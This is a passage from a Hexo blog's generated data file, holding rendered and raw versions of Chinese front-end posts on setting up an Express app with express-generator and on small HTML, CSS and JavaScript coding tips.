class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// app.js</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> express = <span class=\"built_in\">require</span>(<span class=\"string\">'express'</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> app = express();</span><br><span class=\"line\"></span><br><span class=\"line\">app.get(<span class=\"string\">'/'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">  res.send(<span class=\"string\">'Hello World!'</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.listen(<span class=\"number\">3000</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">'Example app listening on port 3000!'</span>);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>应用程序会启动服务器，并在端口 3000 上侦听连接。此应用程序以“Hello World!”响应针对根 URL (/) 或路由的请求。对于其他所有路径，它将以 404 Not Found 进行响应。<br><code>req（请求）和 res（响应）与 Node 提供的对象完全相同，所以您可以在不涉及 Express 的情况下调用 req.pipe()、req.on(&#39;data&#39;, callback) 和要执行的其他任何函数。</code></p>\n<blockquote>\n<p>使用以下命令运行应用程序：</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ node app.js</span><br></pre></td></tr></table></figure>\n<p>然后，在浏览器中输入 <a href=\"http://localhost:3000/\" target=\"_blank\" rel=\"noopener\">http://localhost:3000/</a> 以查看输出。</p>\n<ul>\n<li><a name=\"generator\">1.3 Express生成器</a></li>\n</ul>\n<p><code>Express 生成器的作用就像是为完整的应用程序建立一个“脚手架”，包含各种用途的 JavaScript 文件、Jade 模板和子目录。</code></p>\n<blockquote>\n<p>使用以下命令安装 express：</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm install express-generator -g</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>使用 -h 选项显示命令选项：</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ express -h</span><br><span class=\"line\"></span><br><span class=\"line\">  Usage: express [options] [dir]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">  Options:</span><br><span class=\"line\"></span><br><span class=\"line\">        --version        output the version number</span><br><span class=\"line\">    -e, --ejs            add ejs engine support</span><br><span class=\"line\">        --pug            add pug engine support</span><br><span class=\"line\">        --hbs            add handlebars engine support</span><br><span class=\"line\">    -H, --hogan          add hogan.js engine support</span><br><span class=\"line\">    -v, --view &lt;engine&gt;  add view &lt;engine&gt; support (dust|ejs|hbs|hjs|jade|pug|twig|vash) (defaults to jade                                                                                                                                   )</span><br><span class=\"line\">    -c, --css &lt;engine&gt;   add stylesheet &lt;engine&gt; support (less|stylus|compass|sass) (defaults to plain css                                                                                                                                   )</span><br><span class=\"line\">        --git            add .gitignore</span><br><span class=\"line\">    -f, --force          force on non-empty directory</span><br><span class=\"line\">    -h, --<span class=\"built_in\">help</span>           output usage information</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>例如，以下语句在当前工作目录中创建名为 <code>myapp</code> 的 <code>Express</code> 应用程序：</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ express --view=pug myapp</span><br><span class=\"line\"></span><br><span class=\"line\">   create : myapp</span><br><span class=\"line\">   create : myapp/package.json</span><br><span class=\"line\">   create : myapp/app.js</span><br><span class=\"line\">   create : myapp/views</span><br><span class=\"line\">   create : myapp/views/index.pug</span><br><span class=\"line\">   create : myapp/views/layout.pug</span><br><span class=\"line\">   create : myapp/views/error.pug</span><br><span class=\"line\">   create : myapp/public</span><br><span class=\"line\">   create : myapp/routes</span><br><span class=\"line\">   create : myapp/routes/index.js</span><br><span class=\"line\">   create : myapp/routes/users.js</span><br><span class=\"line\">   create : myapp/bin</span><br><span class=\"line\">   create : myapp/bin/www</span><br><span class=\"line\">   create : myapp/public/images</span><br><span class=\"line\">   create : myapp/public/stylesheets</span><br><span class=\"line\">   create : myapp/public/stylesheets/style.css</span><br><span class=\"line\"></span><br><span class=\"line\">   install dependencies:</span><br><span class=\"line\">     $ <span class=\"built_in\">cd</span> myapp &amp;&amp; npm install</span><br><span class=\"line\"></span><br><span class=\"line\">   run the app:</span><br><span class=\"line\">     $ DEBUG=myapp:* npm start</span><br><span class=\"line\"></span><br><span class=\"line\">   create : myapp/public/javascripts</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>进入到 <code>myapp</code> 目录，然后安装依赖项：</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm install</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>在 MacOS 或 Linux 上，采用以下命令运行此应用程序：</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ DEBUG=myapp:* npm start</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>在 Windows 上，使用以下命令：</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">set</span> DEBUG=myapp:* &amp; npm start</span><br></pre></td></tr></table></figure>\n<p>或者直接<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm start</span><br></pre></td></tr></table></figure></p>\n<p><em>然后在浏览器中输入 <a href=\"http://localhost:3000/\" target=\"_blank\" rel=\"noopener\">http://localhost:3000/</a> 以访问此应用程序。</em></p>\n<blockquote>\n<p>生成的应用程序具有以下目录结构：</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.</span><br><span class=\"line\">├── app.js</span><br><span class=\"line\">├── bin</span><br><span class=\"line\">│   └── www</span><br><span class=\"line\">├── package.json</span><br><span class=\"line\">├── public</span><br><span class=\"line\">│   ├── images</span><br><span class=\"line\">│   ├── javascripts</span><br><span class=\"line\">│   └── stylesheets</span><br><span class=\"line\">│       └── style.css</span><br><span class=\"line\">├── routes</span><br><span class=\"line\">│   ├── index.js</span><br><span class=\"line\">│   └── users.js</span><br><span class=\"line\">└── views</span><br><span class=\"line\">    ├── error.pug</span><br><span class=\"line\">    ├── index.pug</span><br><span class=\"line\">    └── layout.pug</span><br><span class=\"line\"></span><br><span class=\"line\">7 directories, 9 files</span><br></pre></td></tr></table></figure>\n<p><code>生成器创建的应用程序结构只是构造 Express 应用程序的众多方法之一。请随意使用此结构或者对其进行修改以最大程度满足自己的需求。</code></p>\n<ul>\n<li><a name=\"basicrouter\">1.4 基本路由</a></li>\n<li><a name=\"static\">1.5 静态文件处理</a></li>\n</ul>\n"},{"id":"0809027","title":"实用编码小技巧总结","date":"2017-07-19T07:43:09.000Z","_content":"\n- **<a href=\"#html\">HTML</a>**\n  - <a href=\"#selectPlaceholder\">给 select 加一个 placeholder</a>\n\n\n- **<a href=\"#css\">CSS</a>**\n  - <a href=\"#autoInput\">chrome 表单自动填充样式修改</a>\n \n\n- **<a href=\"#javascript\">JavaScript</a>**\n  - <a href=\"#jsonKey\">获取JSON的key</a>\n  - <a href=\"#getFileExtension\">获取文件扩展名</a>\n\n\n#### <a name=\"html\">1、HTML</a>\n\n- **<a name=\"selectPlaceholder\">`给 select 加一个 placeholder`</a>**\n  ```html\n  <select name=\"select\" id=\"select\">\n    <option value=\"\" disabled=\"\" selected=\"\" hidden=\"\">请选择</option>\n    <option value=\"0\">HTML</option>\n    <option value=\"1\">CSS</option>\n    <option value=\"2\">JavaScript</option>\n  </select>\n  ```\n\n----\n#### <a name=\"css\">2、CSS</a>\n\n- **<a name=\"autoInput\">`chrome 表单自动填充样式修改`</a>**\n  ```css\n  input:-webkit-autofill,\n  select:-webkit-autofill,\n  textarea:-webkit-autofill { \n    /* 自动填充的字体颜色 */\n    -webkit-text-fill-color: #666 !important;\n\n    /* 设置背景相关样式 */\n    -webkit-box-shadow: 0 0 0px 1000px #fff inset !important;\n\n    /* 其他样式 */\n    background-color: #FFF;\n    background-image: none;\n  } \n  ```\n\n----\n#### <a name=\"javascript\">3、JavaScript</a>\n\n- **<a name=\"jsonKey\">`获取 JSON 的 key`</a>**\n  ```js\n  var obj = { name: \"naruto\", age: 23, dad: \"minato\"}\n\n  // 1、使用 `for in` 来循环：\n  for (var key in obj){\n    console.log(key) // 依次输出 \"name\", \"age\", \"dad\"\n  }\n  \n  // 2、使用 `Object.keys()` 来获取 :\n  console.log( Object.keys(obj) ) // 输出一个数组 [\"name\", \"age\", \"dad\"]\n  // 所以, 当我们需要某个 `key` 值时可以从当前数组中取得。\n  ```\n\n-- **<a name=\"getFileExtension\">`获取文件扩展名`</a>**\n  ```js\n    function getFileExtension(filename) {\n    return filename.slice((filename.lastIndexOf(\".\") - 1 >>> 0) + 2);\n  }\n\n  // `String.lastIndexOf()` 方法返回指定值（本例中的`.`）在调用该方法的字符串中最后出现的位置，如果没找到则返回 -1。\n  // 对于`filename`和`.hiddenfile`，`lastIndexOf` 的返回值分别为0和-1无符号右移操作符(»>) 将-1转换为4294967295，将-2转换为4294967294，\n  // 这个方法可以保证边缘情况时文件名不变。\n  // `String.prototype.slice()` 从上面计算的索引处提取文件的扩展名。如果索引比文件名的长度大，结果为\"\"。\n  ```","source":"_posts/0809027_实用编码小技巧总结.md","raw":"---\nid: 0809027\ntitle: 实用编码小技巧总结\ndate: 2017-07-19 15:43:09\ntags:\n  - HTML\n  - CSS\n  - JavaScript\ncategories:\n---\n\n- **<a href=\"#html\">HTML</a>**\n  - <a href=\"#selectPlaceholder\">给 select 加一个 placeholder</a>\n\n\n- **<a href=\"#css\">CSS</a>**\n  - <a href=\"#autoInput\">chrome 表单自动填充样式修改</a>\n \n\n- **<a href=\"#javascript\">JavaScript</a>**\n  - <a href=\"#jsonKey\">获取JSON的key</a>\n  - <a href=\"#getFileExtension\">获取文件扩展名</a>\n\n\n#### <a name=\"html\">1、HTML</a>\n\n- **<a name=\"selectPlaceholder\">`给 select 加一个 placeholder`</a>**\n  ```html\n  <select name=\"select\" id=\"select\">\n    <option value=\"\" disabled=\"\" selected=\"\" hidden=\"\">请选择</option>\n    <option value=\"0\">HTML</option>\n    <option value=\"1\">CSS</option>\n    <option value=\"2\">JavaScript</option>\n  </select>\n  ```\n\n----\n#### <a name=\"css\">2、CSS</a>\n\n- **<a name=\"autoInput\">`chrome 表单自动填充样式修改`</a>**\n  ```css\n  input:-webkit-autofill,\n  select:-webkit-autofill,\n  textarea:-webkit-autofill { \n    /* 自动填充的字体颜色 */\n    -webkit-text-fill-color: #666 !important;\n\n    /* 设置背景相关样式 */\n    -webkit-box-shadow: 0 0 0px 1000px #fff inset !important;\n\n    /* 其他样式 */\n    background-color: #FFF;\n    background-image: none;\n  } \n  ```\n\n----\n#### <a name=\"javascript\">3、JavaScript</a>\n\n- **<a name=\"jsonKey\">`获取 JSON 的 key`</a>**\n  ```js\n  var obj = { name: \"naruto\", age: 23, dad: \"minato\"}\n\n  // 1、使用 `for in` 来循环：\n  for (var key in obj){\n    console.log(key) // 依次输出 \"name\", \"age\", \"dad\"\n  }\n  \n  // 2、使用 `Object.keys()` 来获取 :\n  console.log( Object.keys(obj) ) // 输出一个数组 [\"name\", \"age\", \"dad\"]\n  // 所以, 当我们需要某个 `key` 值时可以从当前数组中取得。\n  ```\n\n-- **<a name=\"getFileExtension\">`获取文件扩展名`</a>**\n  ```js\n    function getFileExtension(filename) {\n    return filename.slice((filename.lastIndexOf(\".\") - 1 >>> 0) + 2);\n  }\n\n  // `String.lastIndexOf()` 方法返回指定值（本例中的`.`）在调用该方法的字符串中最后出现的位置，如果没找到则返回 -1。\n  // 对于`filename`和`.hiddenfile`，`lastIndexOf` 的返回值分别为0和-1无符号右移操作符(»>) 将-1转换为4294967295，将-2转换为4294967294，\n  // 这个方法可以保证边缘情况时文件名不变。\n  // `String.prototype.slice()` 从上面计算的索引处提取文件的扩展名。如果索引比文件名的长度大，结果为\"\"。\n  ```","slug":"0809027_实用编码小技巧总结","published":1,"updated":"2018-03-26T12:21:52.224Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvw4002ls4c0fi2973f5","content":"<ul>\n<li><strong><a href=\"#html\">HTML</a></strong><ul>\n<li><a href=\"#selectPlaceholder\">给 select 加一个 placeholder</a></li>\n</ul>\n</li>\n</ul>\n<ul>\n<li><strong><a href=\"#css\">CSS</a></strong><ul>\n<li><a href=\"#autoInput\">chrome 表单自动填充样式修改</a></li>\n</ul>\n</li>\n</ul>\n<ul>\n<li><strong><a href=\"#javascript\">JavaScript</a></strong><ul>\n<li><a href=\"#jsonKey\">获取JSON的key</a></li>\n<li><a href=\"#getFileExtension\">获取文件扩展名</a></li>\n</ul>\n</li>\n</ul>\n<h4 id=\"1、HTML\"><a href=\"#1、HTML\" class=\"headerlink\" title=\"1、HTML\"></a><a name=\"html\">1、HTML</a></h4><ul>\n<li><strong><a name=\"selectPlaceholder\"><code>给 select 加一个 placeholder</code></a></strong><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">select</span> <span class=\"attr\">name</span>=<span class=\"string\">\"select\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"select\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">disabled</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">selected</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">hidden</span>=<span class=\"string\">\"\"</span>&gt;</span>请选择<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">\"0\"</span>&gt;</span>HTML<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">\"1\"</span>&gt;</span>CSS<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">\"2\"</span>&gt;</span>JavaScript<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">select</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<hr>\n<h4 id=\"2、CSS\"><a href=\"#2、CSS\" class=\"headerlink\" title=\"2、CSS\"></a><a name=\"css\">2、CSS</a></h4><ul>\n<li><strong><a name=\"autoInput\"><code>chrome 表单自动填充样式修改</code></a></strong><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">input</span><span class=\"selector-pseudo\">:-webkit-autofill</span>,</span><br><span class=\"line\"><span class=\"selector-tag\">select</span><span class=\"selector-pseudo\">:-webkit-autofill</span>,</span><br><span class=\"line\"><span class=\"selector-tag\">textarea</span><span class=\"selector-pseudo\">:-webkit-autofill</span> &#123; </span><br><span class=\"line\">  <span class=\"comment\">/* 自动填充的字体颜色 */</span></span><br><span class=\"line\">  <span class=\"attribute\">-webkit-text-fill-color</span>: <span class=\"number\">#666</span> <span class=\"meta\">!important</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* 设置背景相关样式 */</span></span><br><span class=\"line\">  <span class=\"attribute\">-webkit-box-shadow</span>: <span class=\"number\">0</span> <span class=\"number\">0</span> <span class=\"number\">0px</span> <span class=\"number\">1000px</span> <span class=\"number\">#fff</span> inset <span class=\"meta\">!important</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* 其他样式 */</span></span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: <span class=\"number\">#FFF</span>;</span><br><span class=\"line\">  <span class=\"attribute\">background-image</span>: none;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<hr>\n<h4 id=\"3、JavaScript\"><a href=\"#3、JavaScript\" class=\"headerlink\" title=\"3、JavaScript\"></a><a name=\"javascript\">3、JavaScript</a></h4><ul>\n<li><strong><a name=\"jsonKey\"><code>获取 JSON 的 key</code></a></strong><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123; <span class=\"attr\">name</span>: <span class=\"string\">\"naruto\"</span>, <span class=\"attr\">age</span>: <span class=\"number\">23</span>, <span class=\"attr\">dad</span>: <span class=\"string\">\"minato\"</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 1、使用 `for in` 来循环：</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> key <span class=\"keyword\">in</span> obj)&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(key) <span class=\"comment\">// 依次输出 \"name\", \"age\", \"dad\"</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 2、使用 `Object.keys()` 来获取 :</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log( <span class=\"built_in\">Object</span>.keys(obj) ) <span class=\"comment\">// 输出一个数组 [\"name\", \"age\", \"dad\"]</span></span><br><span class=\"line\"><span class=\"comment\">// 所以, 当我们需要某个 `key` 值时可以从当前数组中取得。</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>– <strong><a name=\"getFileExtension\"><code>获取文件扩展名</code></a></strong><br>  <figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getFileExtension</span>(<span class=\"params\">filename</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> filename.slice((filename.lastIndexOf(<span class=\"string\">\".\"</span>) - <span class=\"number\">1</span> &gt;&gt;&gt; <span class=\"number\">0</span>) + <span class=\"number\">2</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// `String.lastIndexOf()` 方法返回指定值（本例中的`.`）在调用该方法的字符串中最后出现的位置，如果没找到则返回 -1。</span></span><br><span class=\"line\"><span class=\"comment\">// 对于`filename`和`.hiddenfile`，`lastIndexOf` 的返回值分别为0和-1无符号右移操作符(»&gt;) 将-1转换为4294967295，将-2转换为4294967294，</span></span><br><span class=\"line\"><span class=\"comment\">// 这个方法可以保证边缘情况时文件名不变。</span></span><br><span class=\"line\"><span class=\"comment\">// `String.prototype.slice()` 从上面计算的索引处提取文件的扩展名。如果索引比文件名的长度大，结果为\"\"。</span></span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><strong><a href=\"#html\">HTML</a></strong><ul>\n<li><a href=\"#selectPlaceholder\">给 select 加一个 placeholder</a></li>\n</ul>\n</li>\n</ul>\n<ul>\n<li><strong><a href=\"#css\">CSS</a></strong><ul>\n<li><a href=\"#autoInput\">chrome 表单自动填充样式修改</a></li>\n</ul>\n</li>\n</ul>\n<ul>\n<li><strong><a href=\"#javascript\">JavaScript</a></strong><ul>\n<li><a href=\"#jsonKey\">获取JSON的key</a></li>\n<li><a href=\"#getFileExtension\">获取文件扩展名</a></li>\n</ul>\n</li>\n</ul>\n<h4 id=\"1、HTML\"><a href=\"#1、HTML\" class=\"headerlink\" title=\"1、HTML\"></a><a name=\"html\">1、HTML</a></h4><ul>\n<li><strong><a name=\"selectPlaceholder\"><code>给 select 加一个 placeholder</code></a></strong><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">select</span> <span class=\"attr\">name</span>=<span class=\"string\">\"select\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"select\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">disabled</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">selected</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">hidden</span>=<span class=\"string\">\"\"</span>&gt;</span>请选择<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">\"0\"</span>&gt;</span>HTML<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">\"1\"</span>&gt;</span>CSS<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">\"2\"</span>&gt;</span>JavaScript<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">select</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<hr>\n<h4 id=\"2、CSS\"><a href=\"#2、CSS\" class=\"headerlink\" title=\"2、CSS\"></a><a name=\"css\">2、CSS</a></h4><ul>\n<li><strong><a name=\"autoInput\"><code>chrome 表单自动填充样式修改</code></a></strong><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">input</span><span class=\"selector-pseudo\">:-webkit-autofill</span>,</span><br><span class=\"line\"><span class=\"selector-tag\">select</span><span class=\"selector-pseudo\">:-webkit-autofill</span>,</span><br><span class=\"line\"><span class=\"selector-tag\">textarea</span><span class=\"selector-pseudo\">:-webkit-autofill</span> &#123; </span><br><span class=\"line\">  <span class=\"comment\">/* 自动填充的字体颜色 */</span></span><br><span class=\"line\">  <span class=\"attribute\">-webkit-text-fill-color</span>: <span class=\"number\">#666</span> <span class=\"meta\">!important</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* 设置背景相关样式 */</span></span><br><span class=\"line\">  <span class=\"attribute\">-webkit-box-shadow</span>: <span class=\"number\">0</span> <span class=\"number\">0</span> <span class=\"number\">0px</span> <span class=\"number\">1000px</span> <span class=\"number\">#fff</span> inset <span class=\"meta\">!important</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* 其他样式 */</span></span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: <span class=\"number\">#FFF</span>;</span><br><span class=\"line\">  <span class=\"attribute\">background-image</span>: none;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<hr>\n<h4 id=\"3、JavaScript\"><a href=\"#3、JavaScript\" class=\"headerlink\" title=\"3、JavaScript\"></a><a name=\"javascript\">3、JavaScript</a></h4><ul>\n<li><strong><a name=\"jsonKey\"><code>获取 JSON 的 key</code></a></strong><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123; <span class=\"attr\">name</span>: <span class=\"string\">\"naruto\"</span>, <span class=\"attr\">age</span>: <span class=\"number\">23</span>, <span class=\"attr\">dad</span>: <span class=\"string\">\"minato\"</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 1、使用 `for in` 来循环：</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> key <span class=\"keyword\">in</span> obj)&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(key) <span class=\"comment\">// 依次输出 \"name\", \"age\", \"dad\"</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 2、使用 `Object.keys()` 来获取 :</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log( <span class=\"built_in\">Object</span>.keys(obj) ) <span class=\"comment\">// 输出一个数组 [\"name\", \"age\", \"dad\"]</span></span><br><span class=\"line\"><span class=\"comment\">// 所以, 当我们需要某个 `key` 值时可以从当前数组中取得。</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>– <strong><a name=\"getFileExtension\"><code>获取文件扩展名</code></a></strong><br>  <figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getFileExtension</span>(<span class=\"params\">filename</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> filename.slice((filename.lastIndexOf(<span class=\"string\">\".\"</span>) - <span class=\"number\">1</span> &gt;&gt;&gt; <span class=\"number\">0</span>) + <span class=\"number\">2</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span 